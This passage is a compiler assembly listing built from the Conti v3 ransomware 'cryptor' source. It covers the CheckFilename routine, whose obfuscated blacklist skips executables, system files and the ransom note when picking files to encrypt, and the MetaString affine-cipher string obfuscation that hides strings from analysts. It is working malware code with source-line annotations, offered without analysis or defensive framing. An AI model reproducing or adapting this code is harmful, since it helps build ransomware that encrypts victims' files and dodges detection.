	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001d9	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  001dd	88 85 c0 00 00
	00		 mov	 BYTE PTR tv168[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  001e3	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001ea	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  001f1	5f		 pop	 rdi
  001f2	5d		 pop	 rbp
  001f3	c3		 ret	 0
??0?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
;	COMDAT ?CheckFilename@@YAHPEB_W@Z
_TEXT	SEGMENT
BlackList$ = 16
Count$ = 100
i$4 = 132
$T5 = 552
$T6 = 600
$T7 = 648
$T8 = 696
$T9 = 744
$T10 = 792
$T11 = 840
$T12 = 904
FileName$ = 976
?CheckFilename@@YAHPEB_W@Z PROC				; CheckFilename, COMDAT

; 72   : {

$LN8:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec d8 03
	00 00		 sub	 rsp, 984		; 000003d8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00018	b9 8e 00 00 00	 mov	 ecx, 142		; 0000008eH
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 f8
	03 00 00	 mov	 rcx, QWORD PTR [rsp+1016]
  0002c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__A3B0747C_search@cpp
  00033	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 73   : 	LPCWSTR BlackList[] =
; 74   : 	{
; 75   : 
; 76   : 		OBFW(L".exe"),

  00038	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_19DOGDICKI@?$AA?4?$AAe?$AAx?$AAe@
  0003f	48 8d 8d 28 02
	00 00		 lea	 rcx, QWORD PTR $T5[rbp]
  00046	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
  0004b	48 8b c8	 mov	 rcx, rax
  0004e	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00053	48 89 45 10	 mov	 QWORD PTR BlackList$[rbp], rax

; 77   : 		OBFW(L".dll"),

  00057	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_19BHIGINDB@?$AA?4?$AAd?$AAl?$AAl@
  0005e	48 8d 8d 58 02
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  00065	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
  0006a	48 8b c8	 mov	 rcx, rax
  0006d	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00072	48 89 45 18	 mov	 QWORD PTR BlackList$[rbp+8], rax

; 78   : 		OBFW(L".lnk"),

  00076	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_19BEHMAPDG@?$AA?4?$AAl?$AAn?$AAk@
  0007d	48 8d 8d 88 02
	00 00		 lea	 rcx, QWORD PTR $T7[rbp]
  00084	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
  00089	48 8b c8	 mov	 rcx, rax
  0008c	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00091	48 89 45 20	 mov	 QWORD PTR BlackList$[rbp+16], rax

; 79   : 		OBFW(L".sys"),

  00095	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_19DKJJGBOC@?$AA?4?$AAs?$AAy?$AAs@
  0009c	48 8d 8d b8 02
	00 00		 lea	 rcx, QWORD PTR $T8[rbp]
  000a3	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
  000a8	48 8b c8	 mov	 rcx, rax
  000ab	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  000b0	48 89 45 28	 mov	 QWORD PTR BlackList$[rbp+24], rax

; 80   : 		OBFW(L".msi"),

  000b4	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_19MNJHNGGG@?$AA?4?$AAm?$AAs?$AAi@
  000bb	48 8d 8d e8 02
	00 00		 lea	 rcx, QWORD PTR $T9[rbp]
  000c2	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
  000c7	48 8b c8	 mov	 rcx, rax
  000ca	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  000cf	48 89 45 30	 mov	 QWORD PTR BlackList$[rbp+32], rax

; 81   : 		OBFW(L"readme.txt"),

  000d3	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1BG@ICLDBDGN@?$AAr?$AAe?$AAa?$AAd?$AAm?$AAe?$AA?4?$AAt?$AAx?$AAt@
  000da	48 8d 8d 18 03
	00 00		 lea	 rcx, QWORD PTR $T10[rbp]
  000e1	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >
  000e6	48 8b c8	 mov	 rcx, rax
  000e9	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
  000ee	48 89 45 38	 mov	 QWORD PTR BlackList$[rbp+40], rax

; 82   : 		OBFW(L"CONTI_LOG.txt"),

  000f2	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1BM@CNNHHOMD@?$AAC?$AAO?$AAN?$AAT?$AAI?$AA_?$AAL?$AAO?$AAG?$AA?4?$AAt?$AAx?$AAt@
  000f9	48 8d 8d 48 03
	00 00		 lea	 rcx, QWORD PTR $T11[rbp]
  00100	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAA@PEBE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >
  00105	48 8b c8	 mov	 rcx, rax
  00108	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAAPEBDXZ ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::decrypt
  0010d	48 89 45 40	 mov	 QWORD PTR BlackList$[rbp+48], rax

; 83   : 		OBFW(L".bat")

  00111	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_19PINKOIBI@?$AA?4?$AAb?$AAa?$AAt@
  00118	48 8d 8d 88 03
	00 00		 lea	 rcx, QWORD PTR $T12[rbp]
  0011f	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
  00124	48 8b c8	 mov	 rcx, rax
  00127	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0012c	48 89 45 48	 mov	 QWORD PTR BlackList$[rbp+56], rax

; 84   : 
; 85   : 	};
; 86   : 
; 87   : 	if (pStrStrIW(FileName, global::GetExtention())) {

  00130	e8 00 00 00 00	 call	 ?GetExtention@global@@YAPEA_WXZ ; global::GetExtention
  00135	48 8b d0	 mov	 rdx, rax
  00138	48 8b 8d d0 03
	00 00		 mov	 rcx, QWORD PTR FileName$[rbp]
  0013f	e8 00 00 00 00	 call	 ?pStrStrIW@@YAPEB_WPEB_W0@Z ; pStrStrIW
  00144	48 85 c0	 test	 rax, rax
  00147	74 04		 je	 SHORT $LN5@CheckFilen

; 88   : 		return FALSE;

  00149	33 c0		 xor	 eax, eax
  0014b	eb 54		 jmp	 SHORT $LN1@CheckFilen
$LN5@CheckFilen:

; 89   : 	}
; 90   : 
; 91   : 	INT Count = sizeof(BlackList) / sizeof(LPWSTR);

  0014d	c7 45 64 08 00
	00 00		 mov	 DWORD PTR Count$[rbp], 8

; 92   : 	for (INT i = 0; i < Count; i++) {

  00154	c7 85 84 00 00
	00 00 00 00 00	 mov	 DWORD PTR i$4[rbp], 0
  0015e	eb 0e		 jmp	 SHORT $LN4@CheckFilen
$LN2@CheckFilen:
  00160	8b 85 84 00 00
	00		 mov	 eax, DWORD PTR i$4[rbp]
  00166	ff c0		 inc	 eax
  00168	89 85 84 00 00
	00		 mov	 DWORD PTR i$4[rbp], eax
$LN4@CheckFilen:
  0016e	8b 45 64	 mov	 eax, DWORD PTR Count$[rbp]
  00171	39 85 84 00 00
	00		 cmp	 DWORD PTR i$4[rbp], eax
  00177	7d 23		 jge	 SHORT $LN3@CheckFilen

; 93   : 		if (pStrStrIW(FileName, BlackList[i])) {

  00179	48 63 85 84 00
	00 00		 movsxd	 rax, DWORD PTR i$4[rbp]
  00180	48 8b 54 c5 10	 mov	 rdx, QWORD PTR BlackList$[rbp+rax*8]
  00185	48 8b 8d d0 03
	00 00		 mov	 rcx, QWORD PTR FileName$[rbp]
  0018c	e8 00 00 00 00	 call	 ?pStrStrIW@@YAPEB_WPEB_W0@Z ; pStrStrIW
  00191	48 85 c0	 test	 rax, rax
  00194	74 04		 je	 SHORT $LN6@CheckFilen

; 94   : 			return FALSE;

  00196	33 c0		 xor	 eax, eax
  00198	eb 07		 jmp	 SHORT $LN1@CheckFilen
$LN6@CheckFilen:

; 95   : 		}
; 96   : 	}

  0019a	eb c4		 jmp	 SHORT $LN2@CheckFilen
$LN3@CheckFilen:

; 97   : 
; 98   : 	return TRUE;

  0019c	b8 01 00 00 00	 mov	 eax, 1
$LN1@CheckFilen:

; 99   : }

  001a1	48 8b f8	 mov	 rdi, rax
  001a4	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  001a8	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?CheckFilename@@YAHPEB_W@Z$rtcFrameData
  001af	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  001b4	48 8b c7	 mov	 rax, rdi
  001b7	48 8d a5 b8 03
	00 00		 lea	 rsp, QWORD PTR [rbp+952]
  001be	5f		 pop	 rdi
  001bf	5d		 pop	 rbp
  001c0	c3		 ret	 0
?CheckFilename@@YAHPEB_W@Z ENDP				; CheckFilename
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 53	 sub	 eax, 83			; 00000053H
  0002d	6b c0 e5	 imul	 eax, eax, -27
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 2f	 imul	 eax, eax, 47		; 0000002fH
  0002d	83 c0 53	 add	 eax, 83			; 00000053H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 12	 cmp	 QWORD PTR i$1[rbp], 18
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
_TEXT	ENDS
